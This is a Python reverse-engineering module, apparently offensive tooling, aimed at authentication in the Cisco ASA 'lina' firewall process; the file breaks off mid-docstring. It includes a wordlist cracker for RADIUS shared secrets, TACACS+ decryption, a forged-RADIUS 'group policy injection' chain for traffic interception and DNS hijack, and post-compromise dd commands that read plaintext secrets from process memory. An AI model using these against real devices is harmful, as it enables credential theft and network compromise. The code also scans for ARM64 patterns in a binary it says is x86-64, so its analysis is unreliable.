"""
cisco_asa_lina_re.py — Cisco ASA lina binary RE module

Targets the authentication/authorization subsystem in the lina process:
  lina = the monolithic ASA firewall process (ELF, dynamically linked)
  Auth surface: RADIUS NAS client, TACACS+ client, WebVPN/CSTP cut-through proxy

=== CONFIRMED FROM ASA 9.14.2.14 LINA (real binary) ===
  Build: asa9-14-2-14-smp-k8.bin -> rootfs.img (CPIO) -> asa/bin/lina
  Architecture: x86-64 ELF (NOT ARM64 as originally assumed)
  Size: 95MB stripped dynamically linked ELF
  BuildID: 65cd0306770da18bb71c057dc0dd1472391a1569
  NOTE: ARM64 would apply to ASA-on-Firepower (FTD) chassis; classic ASA HW = x86-64

  RADIUS VSA attribute strings confirmed in .rodata:
    cVPN3000-IETF-Radius-Class   — IETF Class attr (25) → group policy assignment
    cVPN3000-Group-Policy        — direct group policy from RADIUS
    cVPN3000-Cisco-AV-Pair       — Cisco AV-pair VSA
    cVPN3000-Tunnel-Group-Lock   — pin user to specific tunnel group
    Cisco-AV-pair                — standard Cisco VSA (vendor 9, attr 1)
    Tunnel-Group-Name            — attribute name used in assignment log messages
    DfltGrpPolicy                — default group policy name (literal in binary)
    DefaultWEBVPNGroup           — default WebVPN tunnel group name

  SAML (lasso library) functions confirmed:
    lasso_login_init_authn_request
    lasso_login_process_authn_response_msg
    lasso_login_build_authn_request_msg
    lasso_login_build_authn_response_msg
    lasso_saml2_assertion_validate_audience

  Class attribute injection surface (confirmed string):
    "Class attribute created from LDAP-Class attribute"
    → lina processes LDAP group membership → RADIUS Class attr (attr 25) → group policy

  dACL (downloadable ACL) RADIUS processing confirmed:
    "aaai_dacl_processing_required"
    "dACL processing skipped: no ATTR_FILTER_ID found"
    "dACL %s already exists, using number %d"
    COA mode: "%s: Processing a dacl in COA-PUSH mode. Old server is [%A]"

Architecture reference (ARM64 AAPCS — "9780128192221-arm64-assembly" ch.5):
  X0–X7    : function args (first 8); X0 = return value
  X8–X15   : volatile (caller-saved); X16/X17 = linker scratch
  NOTE: x86-64 SysV ABI applies to real lina (RDI/RSI/RDX/RCX/R8/R9 for args)
  X19–X28  : non-volatile (callee-saved); must be restored before RET
  X29 (FP) : frame pointer — always saved in prologue
  X30 (LR) : link register — holds return address after BL
  SP       : stack pointer — always 16-byte aligned
  BL label : branch-and-link (call); saves PC+4 → X30
  RET      : branches to X30

Standard function prologue:
  STP  x29, x30, [sp, #-N]!   ; allocate frame, save FP+LR
  MOV  x29, sp                 ; establish frame pointer
  STP  x19, x20, [sp, #M]     ; save non-volatile regs if used

Standard function epilogue:
  LDP  x19, x20, [sp, #M]
  LDP  x29, x30, [sp, #-N]!... (or ADD sp, sp, #N)
  RET

RADIUS protocol (RFC 2865):
  Packet: Code(1) + Identifier(1) + Length(2) + Authenticator(16) + Attributes(var)
  Code 1  = Access-Request
  Code 2  = Access-Accept
  Code 3  = Access-Reject
  Code 11 = Access-Challenge (MFA / SDI New-PIN mode)
  User-Password attr (2): MD5(shared_secret + Request-Authenticator) XOR password
    — 16-byte blocks, chained: c[i] = p[i] XOR MD5(S + c[i-1])
  Shared secret: PSK stored as string in .data or .rodata of lina

TACACS+ protocol (RFC 8907):
  Header: MajorVer(1) + MinorVer(1) + Type(1) + SeqNo(1) + Flags(1) + SessionID(4) + Length(4)
  Body encrypted with: XOR against MD5(key + session_id + ver + seq_no) chain
  Port: TCP/49
"""

import struct, hashlib, socket, os, re, sys


# ─── ARM64 CALLING CONVENTION REFERENCE ──────────────────────────────────────

ARM64_REGS = {
    'args':        ['x0','x1','x2','x3','x4','x5','x6','x7'],
    'return':      ['x0'],           # x0 primary, x1/x2/x3 for structs
    'volatile':    ['x0','x1','x2','x3','x4','x5','x6','x7',
                    'x8','x9','x10','x11','x12','x13','x14','x15'],
    'scratch':     ['x16','x17'],    # intra-procedure / PLT trampoline
    'nonvolatile': ['x19','x20','x21','x22','x23','x24','x25',
                    'x26','x27','x28'],
    'fp':          'x29',            # frame pointer
    'lr':          'x30',            # link register (return address)
    'sp':          'sp',             # 16-byte aligned always
    'zr':          'xzr',            # zero register
}

# standard prologue pattern to detect function boundaries in IDA/objdump output
ARM64_PROLOGUE_PATTERN = re.compile(
    r'stp\s+x29,\s*x30,\s*\[sp,\s*#-?(\d+)\]!',
    re.IGNORECASE
)

# indirect call via vtable (common for C++ polymorphic handlers in lina):
# LDR  x8, [x0]          ; load vtable ptr from object
# LDR  x9, [x8, #offset] ; load fn ptr from vtable
# BLR  x9                ; call through vtable
ARM64_VTABLE_CALL = re.compile(
    r'ldr\s+(x\d+),\s*\[(x\d+)\][^\n]*\n.*?blr\s+\1',
    re.IGNORECASE | re.DOTALL
)


# ─── RADIUS PROTOCOL CONSTANTS ───────────────────────────────────────────────

RADIUS_CODES = {
    1:  'Access-Request',
    2:  'Access-Accept',
    3:  'Access-Reject',
    4:  'Accounting-Request',
    5:  'Accounting-Response',
    11: 'Access-Challenge',
    12: 'Status-Server',
    13: 'Status-Client',
    40: 'Disconnect-Request',
    41: 'Disconnect-ACK',
    42: 'Disconnect-NAK',
    43: 'CoA-Request',
    44: 'CoA-ACK',
    45: 'CoA-NAK',
}

RADIUS_ATTRS = {
    1:  'User-Name',
    2:  'User-Password',       # MD5 XOR with shared secret
    3:  'CHAP-Password',
    4:  'NAS-IP-Address',
    5:  'NAS-Port',
    6:  'Service-Type',
    7:  'Framed-Protocol',
    8:  'Framed-IP-Address',
    18: 'Reply-Message',
    24: 'State',               # used in Access-Challenge multi-round auth
    25: 'Class',
    26: 'Vendor-Specific',     # Cisco VSA = vendor 9
    27: 'Session-Timeout',
    61: 'NAS-Port-Type',
    79: 'EAP-Message',         # RFC 3579
    80: 'Message-Authenticator', # HMAC-MD5 of entire packet
}

# Cisco VSA (vendor 9) attribute numbers relevant to ASA VPN auth:
CISCO_VSA = {
    1:  'cisco-av-pair',       # e.g. "ip:addr-pool=vpn-pool"
    146: 'Cisco-SAML-Token',
    150: 'DAP-Policy-List',
}

# Default UDP ports for RADIUS (old vs. new RFC 2866):
RADIUS_PORTS = {
    'auth_old': 1645,
    'acct_old': 1646,
    'auth':     1812,
    'acct':     1813,
    'coa':      3799,          # RFC 5176 Change-of-Authorization
}

TACACS_PORT = 49              # TCP


# ─── KNOWN ASA AAA BINARY PATTERNS ──────────────────────────────────────────
#
# These are string patterns expected in the lina ARM64 ELF that anchor
# the RADIUS/TACACS+ processing functions. Strings in lina are typically
# null-terminated in .rodata, unlike Go's length-prefixed string pool.

LINA_STRING_ANCHORS = {
    # RADIUS state machine anchor strings
    'radius_access_request':  b'Access-Request',
    'radius_access_accept':   b'Access-Accept',
    'radius_access_reject':   b'Access-Reject',
    'radius_access_challenge':b'Access-Challenge',
    'radius_shared_secret':   b'radius-server\x00',
    'radius_timeout':         b'radius-server timeout',

    # TACACS+ anchor strings
    'tacacs_key':             b'tacacs-server key\x00',
    'tacacs_host':            b'tacacs-server host\x00',

    # AAA group config strings
    'aaa_server_group':       b'aaa-server\x00',
    'aaa_authentication':     b'aaa authentication\x00',
    'aaa_authorization':      b'aaa authorization\x00',
    'aaa_accounting':         b'aaa accounting\x00',

    # Crypto anchors (RADIUS password hashing uses MD5)
    'md5_init':               b'MD5Init\x00',
    'md5_update':             b'MD5Update\x00',
    'md5_final':              b'MD5Final\x00',

    # VPN auth context strings
    'anyconnect_auth':        b'AnyConnect\x00',
    'webvpn_group_policy':    b'group-policy\x00',
    'vpn_filter_acl':         b'vpn-filter\x00',
    'vpn_session_db':         b'VPN Session DB\x00',

    # Error message anchors useful for locating auth failure paths
    'aaa_error_server':       b'AAA Server is not responding\x00',
    'aaa_error_reject':       b'Authentication Failure\x00',
    'aaa_debug_radius':       b'RADIUS packet\x00',

    # CONFIRMED in ASA 9.14.2.14 lina (x86-64, 95MB stripped):
    # RADIUS VSA attribute name strings (null-terminated in .rodata)
    'cvpn3000_ietf_class':    b'cVPN3000-IETF-Radius-Class\x00',
    'cvpn3000_group_policy':  b'cVPN3000-Group-Policy\x00',
    'cvpn3000_av_pair':       b'cVPN3000-Cisco-AV-Pair\x00',
    'cvpn3000_tg_lock':       b'cVPN3000-Tunnel-Group-Lock\x00',
    'cisco_av_pair':          b'Cisco-AV-pair\x00',
    'tunnel_group_name':      b'Tunnel-Group-Name\x00',
    'dflt_grp_policy':        b'DfltGrpPolicy\x00',
    'default_webvpn_group':   b'DefaultWEBVPNGroup\x00',
    'class_from_ldap':        b'Class attribute created from LDAP-Class attribute\x00',
    'dacl_coa_push':          b'Processing a dacl in COA-PUSH mode\x00',
    'saml_init_authn':        b'lasso_login_init_authn_request\x00',
    'saml_process_resp':      b'lasso_login_process_authn_response_msg\x00',
    'saml_validate_audience': b'lasso_saml2_assertion_validate_audience\x00',
}

# ─── RADIUS VSA DISPATCH TABLE (CONFIRMED ASA 9.14.2.14) ────────────────────
#
# Two interleaved tables in lina's .data/.bss region map cVPN3000 VSA names
# to lina-internal attribute tokens used by the AAA processing engine.
#
# TABLE-1 (index/lookup) — file offset 0x7a16f8, 24-byte triplets:
#   {str_ptr_64, table2_next_ptr_64, flags_u64=0x8}
#   str_ptr = vaddr of cVPN3000 VSA name string in .rodata
#   table2_next_ptr = vaddr of next entry's str_ptr in TABLE-2 (iterator ptr)
#   flags = 0x8 for all 40 confirmed entries
#
# TABLE-2 (data) — vaddr 0x54e2948, file 0x52e2948, 16-byte pairs:
#   {str_ptr_64, internal_code_u64}
#   internal_code encoding (LE, bottom 32 bits significant):
#     byte[0] = lina internal attribute token ID (sequential)
#     byte[1] = type/flags (0x10 = group-policy domain for most; 0x00 for IETF-mapped attrs)
#     byte[2] = data type class (0x00=IETF, 0x01=bool/enum, 0x02=int, 0x06=flags, 0x07=octet-string)
#     byte[3] = 0x00
#
# KEY ENTRIES CONFIRMED (from binary scan):
RADIUS_VSA_TABLE = {
    # (str_name, vaddr_in_table2, internal_code, decoded)
    'cVPN3000-IETF-Radius-Session-Timeout': (0x54e2948, 0x2001c, 'token=0x1c,type=0x02=int'),
    'cVPN3000-IETF-Radius-Idle-Timeout':    (0x54e2958, 0x11019, 'token=0x19,type=0x01=bool/enum'),
    # === GROUP POLICY INJECTION SURFACE ===
    # IETF Class attribute (attr 25): lina maps it internally as token=0x0b, type=0x07 (octet-string)
    # Attack path: RADIUS Access-Accept with Class attr (25) containing group-policy name
    #   → lina processes Class as octet-string → extracts group-policy name string
    #   → assigns VPN session to named group-policy (tunnel-group, ACL, split-tunnel config)
    # String confirmed at file offset 0x3f0e610: "cVPN3000-IETF-Radius-Class"
    # Companion string confirmed: "Class attribute created from LDAP-Class attribute"
    'cVPN3000-IETF-Radius-Class':    (0x54e2968, 0x7000b,  'token=0x0b,type=0x07=octet-string,ATTACK_SURFACE'),
    'cVPN3000-IETF-Radius-Filter-Id':(0x54e2978, 0x210ce,  'token=0xce,type=0x02=int'),
    'cVPN3000-Auth-Service-Type':    (0x54e2988, 0x21054,  'token=0x54,type=0x02=int'),
    'cVPN3000-Tunnel-Group-Lock':    (0x54e2b28, 0x71056,  'token=0x56,type=0x07=octet-string,ATTACK_SURFACE'),
    'cVPN3000-Authorization-Type':   (0x54e29b8, 0x11043,  'token=0x43,type=0x01=bool/enum'),
    'cVPN3000-WebVPN-SVC-Enable':    (0x54e2ab8, 0x21068,  'token=0x68,type=0x02=int'),
    'cVPN3000-WebVPN-ACL-Filters':   (0x54e29f8, 0x1104c,  'token=0x4c,type=0x01=bool/enum'),
    'cVPN3000-Firewall-ACL-In':      (0x54e2b38, 0x71057,  'token=0x57,type=0x07=octet-string'),
    'cVPN3000-Firewall-ACL-Out':     (0x54e2b48, 0x61058,  'token=0x58,type=0x06=flags'),
}

# GROUP POLICY INJECTION CHAIN (RADIUS Class attribute path):
#
# Attack: forge or relay a RADIUS Access-Accept with a crafted Class (attr 25) value
#   Value bytes = name of an existing group policy (e.g. b"DfltGrpPolicy\x00")
#   The group policy must exist in ASA config — RADIUS cannot CREATE a new one,
#   only SELECT an existing named policy.
#
# Effect of selecting a different group policy:
#   - Override split-tunnel ACL → full-tunnel → MITM all client traffic
#   - Override ACL (vpn-filter) → broader network access
#   - Override idle-timeout / session-timeout → persistent sessions
#   - Override DNS servers → DNS hijack
#
# Known group policy names (default, always present):
KNOWN_DEFAULT_GROUP_POLICIES = [
    b'DfltGrpPolicy',    # confirmed literal in lina .rodata
    b'DefaultWEBVPNGroup',  # confirmed literal in lina .rodata
]

# The cVPN3000-Group-Policy VSA (vendor 3076, attr ?) is the DIRECT path:
# RADIUS Access-Accept with cVPN3000-Group-Policy = "DfltGrpPolicy" sets group policy directly.
# String confirmed in .rodata at file offset 0x3f0e80a.

# RADIUS client function chain in lina (typical symbol names in debug builds;
# in production builds these are recovered via string cross-references):
LINA_RADIUS_FUNCTIONS = {
    'radius_send_access_request':  {
        'xref_strings': ['Access-Request', 'NAS-IP-Address'],
        'signature': 'BL to MD5Init, BL to MD5Update(shared_secret), BL to MD5Update(authenticator), BL to MD5Final',
        'arm64_pattern': (
            # loads shared_secret ptr → X0, then calls MD5
            r'adrp\s+x\d+,\s*0x\w+.*?'
            r'add\s+x0,\s*x\d+,\s*:lo12:\w+.*?'
            r'bl\s+.*?md5'
        ),
    },
    'radius_verify_message_authenticator': {
        'xref_strings': ['Message-Authenticator'],
        'description': 'RFC 2869 attr 80: HMAC-MD5 of entire packet using shared secret',
    },
    'radius_decode_user_password': {
        'xref_strings': ['User-Password', 'user-password'],
        'description': 'decrypts User-Password attr: p = c XOR MD5(S + auth[i-1])',
    },
    'aaa_server_group_select':     {
        'xref_strings': ['aaa-server', 'aaa authentication'],
        'description': 'selects active RADIUS/TACACS+ server from group; load-balances',
    },
    'aaa_process_response':        {
        'xref_strings': ['Access-Accept', 'Access-Reject', 'Access-Challenge'],
        'description': 'main AAA response dispatcher — branches on Code field',
    },
}


# ─── STATIC ANALYSIS METHODOLOGY ─────────────────────────────────────────────
#
# Procedure for locating RADIUS shared secret storage in lina ARM64 ELF:
#
# 1. strings -n 8 lina | grep -E "^[A-Za-z0-9!@#$%^&*]{8,64}$"
#    — Find candidate PSK strings. RADIUS keys are typically 8–64 chars.
#
# 2. Cross-reference each candidate with the MD5 call chain:
#    In ARM64, the shared secret is loaded via ADRP+ADD and passed as X0 to MD5Update.
#    Pattern: ADRP x0, page; ADD x0, x0, :lo12:offset; BL md5update
#    The page+offset resolves to the PSK string's .rodata address.
#
# 3. RADIUS authenticator field (16 bytes at offset 4 in packet) is random in
#    Access-Request and MD5 of full packet in Access-Response.
#    The shared_secret is NEVER sent on wire — it stays in lina's memory.
#
# 4. If lina is running and accessible via /proc/self/mem (pivot):
#    - Map /proc/$(pidof lina)/mem
#    - Read the .data segment where AAA server configs are stored
#    - The aaa-server struct contains: server_ip, port, shared_secret (plaintext)

STATIC_ANALYSIS_METHODOLOGY = {
    'step1_extract_strings': {
        'cmd': 'strings -n 8 -t x lina',
        'purpose': 'recover .rodata strings with virtual addresses; anchor MD5 call xrefs',
    },
    'step2_disassemble': {
        'cmd': 'objdump -d --no-show-raw-insn lina | grep -A 30 "radius\\|aaa_server"',
        'purpose': 'locate RADIUS packet construction functions near string anchors',
    },
    'step3_find_md5_chain': {
        'pattern': 'look for BL to same function 3+ times in same function body',
        'rationale': 'MD5Init, MD5Update (key), MD5Update (data), MD5Final — 4 calls in sequence',
    },
    'step4_trace_psk': {
        'pattern': 'ADRP + ADD immediately before BL md5update',
        'arm64': 'ADRP loads high 21 bits of page; ADD :lo12: adds lower 12; result in X0 = string ptr',
    },
    'step5_aaa_struct_layout': {
        'description': 'reconstruct aaa_server_group_t struct from field accesses',
        'fields': [
            'name[64]       — server group name',
            'protocol       — 0=RADIUS, 1=TACACS+, 2=SDI',
            'server_count   — number of servers',
            'dead_time      — minutes (default 10)',
            'max_failed     — default 3',
            'servers[]      — array of aaa_server_t',
        ],
    },
    'step6_server_struct': {
        'aaa_server_t_fields': [
            'host[64]       — IP or hostname',
            'port           — uint16 (1812 default)',
            'secret[128]    — shared secret PLAINTEXT',
            'timeout        — uint32 (10s default)',
            'retries        — uint8 (2 default)',
            'is_dead        — bool',
        ],
        'arm64_access_pattern': (
            'LDR x1, [x0, #secret_offset]  ; load secret ptr from struct'
        ),
    },
}


# ─── RADIUS PASSWORD ORACLE ATTACK ──────────────────────────────────────────
#
# If we can observe Access-Request packets (e.g. via MITM or SPAN port)
# and know the Request-Authenticator (16 bytes at offset 4),
# we can brute-force the shared secret offline:
#   for each candidate_key:
#       pad = MD5(candidate_key + authenticator)
#       plain = ciphertext XOR pad
#       if plain is printable: candidate is valid PSK
#
# This works because User-Password = plaintext XOR MD5(shared_secret || authenticator)

def radius_password_xor_decrypt(ciphertext: bytes, shared_secret: bytes,
                                 authenticator: bytes) -> bytes:
    """
    Reverse RFC 2865 User-Password encryption.

    c = ciphertext (16-byte blocks)
    p[0..15] = c[0..15] XOR MD5(shared_secret + authenticator)
    p[16..31] = c[16..31] XOR MD5(shared_secret + c[0..15])
    """
    plaintext = bytearray()
    prev = authenticator
    for i in range(0, len(ciphertext), 16):
        block = ciphertext[i:i+16].ljust(16, b'\x00')
        pad = hashlib.md5(shared_secret + prev).digest()
        plaintext += bytes(b ^ p for b, p in zip(block, pad))
        prev = bytes(block)
    return bytes(plaintext).rstrip(b'\x00')


def radius_crack_shared_secret(wordlist_path: str, authenticator: bytes,
                                ciphertext: bytes, known_plaintext: str) -> str | None:
    """
    Known-plaintext attack on RADIUS shared secret.
    Requires: captured Access-Request, known username → infer password if possible.
    More useful: if we control the client and know the password,
    we can verify each candidate key.
    """
    known = known_plaintext.encode().ljust(len(ciphertext), b'\x00')
    try:
        with open(wordlist_path, 'rb') as f:
            for line in f:
                candidate = line.strip()
                decrypted = radius_password_xor_decrypt(ciphertext, candidate, authenticator)
                if decrypted[:len(known_plaintext)] == known_plaintext.encode():
                    return candidate.decode(errors='replace')
    except FileNotFoundError:
        pass
    return None


# ─── TACACS+ KEY EXTRACTION ──────────────────────────────────────────────────
#
# TACACS+ body encryption (RFC 8907 §4.3):
# pad[i] = MD5(key + session_id + version + seq_no + pad[i-1])
# body[i] = plaintext[i] XOR pad[i] (16-byte blocks)
#
# Offline brute-force: capture TACACS+ authen_start packet (seq=1),
# body[0] plaintext is known (authen_type, priv_lvl, authen_method, service, etc.)
# → iterate candidate keys until MD5 chain matches.

TACACS_BODY_START_FIELDS = {
    'authen_type':   {'offset': 0, 'len': 1, 'authen_start_val': 0x01},  # ASCII
    'priv_lvl':      {'offset': 1, 'len': 1, 'authen_start_val': 0x00},  # PRIV_LVL_MIN
    'authen_method': {'offset': 2, 'len': 1, 'authen_start_val': 0x06},  # TAC_PLUS_AUTHEN_METH_TACACSPLUS
    'service':       {'offset': 3, 'len': 1, 'authen_start_val': 0x01},  # TAC_PLUS_AUTHEN_SVC_LOGIN
}


def tacacs_pseudo_pad(key: bytes, session_id: int, version: int,
                      seq_no: int, prev_pad: bytes = b'') -> bytes:
    """Compute single TACACS+ MD5 pseudo-pad block."""
    data = (key +
            struct.pack('>I', session_id) +
            bytes([version, seq_no]) +
            prev_pad)
    return hashlib.md5(data).digest()


def tacacs_decrypt_body(key: bytes, session_id: int, version: int,
                        seq_no: int, ciphertext: bytes) -> bytes:
    """Decrypt full TACACS+ packet body."""
    plaintext = bytearray()
    prev_pad = b''
    for i in range(0, len(ciphertext), 16):
        block = ciphertext[i:i+16]
        pad = tacacs_pseudo_pad(key, session_id, version, seq_no, prev_pad)
        plaintext += bytes(b ^ p for b, p in zip(block, pad))
        prev_pad = pad
    return bytes(plaintext)


# ─── LINA FUNCTION RECONSTRUCTION MAP ───────────────────────────────────────
#
# ARM64 function boundary heuristic for stripped lina binary:
# - Every function starts with STP x29, x30, [sp, #-N]! (canonical prologue)
# - Functions returning void end with LDP x29, x30, ...; RET
# - Tail calls: B label (unconditional branch near end of function, not BL)
# - Exception: leaf functions may omit STP (no calls inside) — watch for
#   simple MOV + RET patterns without any BL instructions.
#
# To find the AAA response handler in a stripped binary:
# 1. search .rodata for b'Access-Accept\x00' → get vaddr A
# 2. find all ADRP+ADD sequences that load vaddr A → candidate functions F_i
# 3. for each F_i, look for a conditional branch table (CBZ/CBNZ + B.EQ/B.NE)
#    over a register that holds the RADIUS code byte (offset 0 in packet)
# 4. The function that branches on {1,2,3,11} → RADIUS response dispatcher

LINA_AAA_STATE_MACHINE = {
    'description': 'RADIUS response dispatcher in lina — branches on Code field',
    'code_field_offset': 0,   # byte 0 of RADIUS packet
    'state_transitions': {
        1: ('send_access_request',   'transition: idle → waiting'),
        2: ('process_accept',        'transition: waiting → authenticated'),
        3: ('process_reject',        'transition: waiting → failed'),
        11: ('process_challenge',    'transition: waiting → challenge_pending'),
    },
    'arm64_branch_table_pattern': (
        # After loading Code byte: CMP w0, #code_val; B.EQ target
        'CMP  w0, #1\n'
        'B.EQ send_access_request\n'
        'CMP  w0, #2\n'
        'B.EQ process_accept\n'
        'CMP  w0, #3\n'
        'B.EQ process_reject\n'
        'CMP  w0, #0xb\n'
        'B.EQ process_challenge'
    ),
    'vtable_alt_pattern': (
        # C++ dispatch: vtable[code] → function pointer
        'ADRP x8, vtable_base_page\n'
        'ADD  x8, x8, :lo12:vtable_base\n'
        'LDRB w9, [packet_ptr]       ; Code byte\n'
        'LDR  x10, [x8, x9, lsl #3] ; vtable[code]\n'
        'BLR  x10'
    ),
}


# ─── MEMORY DUMP TECHNIQUE (post-pivot) ─────────────────────────────────────
#
# If code execution is achieved on the ASA (e.g. via WebVPN shell injection,
# ROMMON bypass, or a live process):
# - /proc/$(pidof lina)/maps → identify .data segment range
# - /proc/$(pidof lina)/mem + lseek to aaa_server struct → read shared secrets
# This is the fastest path to PSK extraction post-pivot.

MEMORY_DUMP_PROCEDURE = {
    'step1': 'cat /proc/$(pidof lina)/maps | grep rw-p | head -20',
    'step2': 'dd if=/proc/$(pidof lina)/mem bs=1 skip=$((0xDATA_ADDR)) count=$((0xSECTION_SIZE)) of=lina_data.bin 2>/dev/null',
    'step3': 'strings -n 8 lina_data.bin | grep -E "^[A-Za-z0-9!@#$%^&*_-]{8,64}$"',
    'rationale': 'shared secrets stored as plaintext C strings in aaa_server_t.secret field',
}


# ─── MODULE ENTRYPOINT ───────────────────────────────────────────────────────

class CiscoASALinaRE:
    """
    Static and dynamic reverse engineering of the Cisco ASA lina binary.

    Focus: ARM64 AAA/RADIUS attack surface.
    Techniques grounded in:
      - "ARM 64-Bit Assembly Language" (9780128192221) — calling conventions
      - "Cisco ASA All-in-One Firewall..." 3e (9780132954389) — AAA architecture
      - RFC 2865 (RADIUS), RFC 8907 (TACACS+)
    """

    NAME = 'cisco_asa_lina_re'
    DESCRIPTION = 'Cisco ASA lina ARM64 binary RE — AAA/RADIUS/TACACS+ attack surface'
    TARGETS = ['lina', '/asa/bin/lina', '/opt/cisco/anyconnect/bin/vpnagentd']

    def __init__(self, binary_path: str | None = None,
                 radius_secret: bytes = b'',
                 tacacs_key: bytes = b''):
        self.binary_path = binary_path
        self.radius_secret = radius_secret
        self.tacacs_key = tacacs_key
        self._findings: list[dict] = []

    def _finding(self, fid: str, sev: str, title: str, detail: str,
                 evidence: dict | None = None):
        self._findings.append({
            'id':       fid,
            'severity': sev,
            'title':    title,
            'detail':   detail,
            'evidence': evidence or {},
        })

    def analyze_binary(self) -> list[dict]:
        """
        Static analysis of the lina binary for AAA/RADIUS attack surface.
        Requires binary_path to point to an extracted lina ELF.
        """
        if not self.binary_path or not os.path.exists(self.binary_path):
            self._finding('LINA_NOT_FOUND', 'INFO',
                'lina binary not found',
                'Supply binary_path= to extracted lina ELF for static analysis.',
                {'hint': 'extract from ASA firmware: binwalk -e asa*.bin; find . -name lina -type f'})
            return self._findings

        with open(self.binary_path, 'rb') as f:
            data = f.read()

        self._check_stripped(data)
        self._extract_string_anchors(data)
        self._check_radius_psk_patterns(data)
        self._check_tacacs_key_patterns(data)
        self._identify_arm64_functions(data)
        return self._findings

    def _check_stripped(self, data: bytes):
        # ELF .symtab presence check
        has_symtab = b'.symtab\x00' in data
        has_debug = b'.debug_info\x00' in data
        self._finding('LINA_SYMBOLS', 'INFO',
            f'Symbol table: {"present" if has_symtab else "STRIPPED"}',
            f'Debug info: {"present" if has_debug else "absent"}. '
            f'{"String xref analysis required." if not has_symtab else "Direct symbol resolution available."}',
            {'has_symtab': has_symtab, 'has_debug': has_debug})

    def _extract_string_anchors(self, data: bytes):
        found = {}
        for name, pattern in LINA_STRING_ANCHORS.items():
            idx = data.find(pattern)
            if idx >= 0:
                found[name] = hex(idx)
        if found:
            self._finding('LINA_STRING_ANCHORS', 'INFO',
                f'Found {len(found)}/{len(LINA_STRING_ANCHORS)} RADIUS/AAA string anchors',
                'Use these offsets to cross-reference AAA processing functions via ADRP+ADD chains.',
                {'anchors': found})

    def _check_radius_psk_patterns(self, data: bytes):
        # Look for 8-128 byte ASCII strings that could be RADIUS shared secrets
        # Heuristic: appear near 'radius-server host' or 'radius-server key' strings
        candidates = []
        key_anchor = data.find(b'radius-server key\x00')
        if key_anchor < 0:
            key_anchor = data.find(b'radius-server\x00')

        if key_anchor >= 0:
            # Scan 256 bytes after anchor for printable strings
            window = data[key_anchor:key_anchor+512]
            for m in re.finditer(rb'[\x20-\x7e]{8,128}\x00', window):
                s = m.group(0)[:-1]
                if not any(kw in s for kw in [b'radius', b'server', b'timeout']):
                    candidates.append(s.decode(errors='replace'))

        if candidates:
            self._finding('LINA_RADIUS_PSK_CANDIDATES', 'HIGH',
                'Potential RADIUS shared secret candidates',
                'Strings found near radius-server config anchors. Verify with captured Access-Request.',
                {'candidates': candidates[:5]})

    def _check_tacacs_key_patterns(self, data: bytes):
        tacacs_anchor = data.find(b'tacacs-server key\x00')
        if tacacs_anchor < 0:
            tacacs_anchor = data.find(b'tacacs-server\x00')

        if tacacs_anchor >= 0:
            window = data[tacacs_anchor:tacacs_anchor+512]
            candidates = []
            for m in re.finditer(rb'[\x20-\x7e]{8,64}\x00', window):
                s = m.group(0)[:-1]
                if not any(kw in s for kw in [b'tacacs', b'server', b'host']):
                    candidates.append(s.decode(errors='replace'))
            if candidates:
                self._finding('LINA_TACACS_KEY_CANDIDATES', 'HIGH',
                    'Potential TACACS+ key candidates',
                    'Strings found near tacacs-server config anchors.',
                    {'candidates': candidates[:5]})

    def _identify_arm64_functions(self, data: bytes):
        # Count canonical ARM64 prologues: STP x29, x30, [sp, #-N]!
        # Binary: E7 x3 BE A9 (little-endian encoding varies by N)
        # Exact: opcode for STP x29,x30,[sp,#-N]! = A9BE7BFD (N=16) or similar
        # Use pattern: bytes A9 Bx 7B FD where x encodes frame size
        count = 0
        for i in range(0, len(data)-4, 4):
            word = struct.unpack_from('<I', data, i)[0]
            # STP x29, x30, [sp, #-N]!
            # encoding: 1010 1001 1011 xxxx 0111 1011 1111 1101
            if (word & 0xFFC07FFF) == 0xA9807BFD:
                count += 1
        self._finding('LINA_FUNCTION_COUNT', 'INFO',
            f'~{count} ARM64 functions identified via canonical prologue',
            'Each STP x29,x30,[sp,#-N]! marks a non-leaf function entry. '
            'Leaf functions (no BL inside) omit the prologue — counted separately.',
            {'prologue_count': count,
             'analysis': 'partition binary by prologue addresses for per-function disassembly'})

    def verify_radius_decrypt(self, ciphertext: bytes, authenticator: bytes) -> bytes | None:
        """
        Attempt User-Password decryption if radius_secret is set.
        Returns plaintext password or None.
        """
        if not self.radius_secret:
            return None
        return radius_password_xor_decrypt(ciphertext, self.radius_secret, authenticator)

    def verify_tacacs_decrypt(self, ciphertext: bytes, session_id: int,
                              version: int = 0xC1, seq_no: int = 1) -> bytes | None:
        if not self.tacacs_key:
            return None
        return tacacs_decrypt_body(self.tacacs_key, session_id, version, seq_no, ciphertext)

    def scan_arm64_prologue_offsets(self, data: bytes) -> list[int]:
        """
        Return list of file offsets where STP x29, x30, [sp, #-N]! appears.
        ARM64 encoding: 1010 1001 10xx xxxx 0111 1011 1111 1101
        Mask: 0xFFC07FFF = 0xA9807BFD (frame-size bits in [21:15] are variable).
        Each hit = start of a non-leaf function.
        """
        hits = []
        for i in range(0, len(data) - 4, 4):
            word = struct.unpack_from('<I', data, i)[0]
            if (word & 0xFFC07FFF) == 0xA9807BFD:
                hits.append(i)
        return hits

    def scan_adrp_string_xrefs(self, data: bytes, target_string: bytes) -> list[int]:
        """
        Find ADRP+ADD sequences in ARM64 code that load a given .rodata string.
        ARM64 string loading in PIC code always uses:
            ADRP Xn, page      ; high 21 bits of target VA
            ADD  Xn, Xn, #lo12 ; low 12 bits = byte offset within page
        This locates all code sites that reference a specific string.

        Strategy: find target_string offset in data → compute expected page+lo12
        → scan for ADRP+ADD pairs whose combined offset matches.
        Returns list of offsets where the ADRP instruction starts.
        """
        str_off = data.find(target_string)
        if str_off < 0:
            return []
        # Heuristic: scan for ADD instructions with lo12 == (str_off & 0xFFF)
        # ADD Xn, Xn, #imm12: encoding 0x91000000 | (imm12 << 10) | (Rn << 5) | Rd
        lo12 = str_off & 0xFFF
        hits = []
        for i in range(4, len(data) - 4, 4):
            word = struct.unpack_from('<I', data, i)[0]
            # ADD (immediate) family: top 10 bits = 0b1001000100 = 0x244
            if (word >> 22) == 0x244:
                imm12 = (word >> 10) & 0xFFF
                if imm12 == lo12:
                    # Check preceding word is ADRP: top 8 bits = 0b10010000..
                    prev = struct.unpack_from('<I', data, i - 4)[0]
                    if (prev >> 24) & 0x9F == 0x90:
                        hits.append(i - 4)
        return hits

    def scan_radius_dispatcher(self, data: bytes) -> dict:
        """
        Locate the RADIUS response dispatcher in stripped lina.

        ARM64 book (Vostokov, ch14): CMP+B.EQ chains on a byte-width register
        are the idiom for switch-style dispatch. The RADIUS Code byte (offset 0
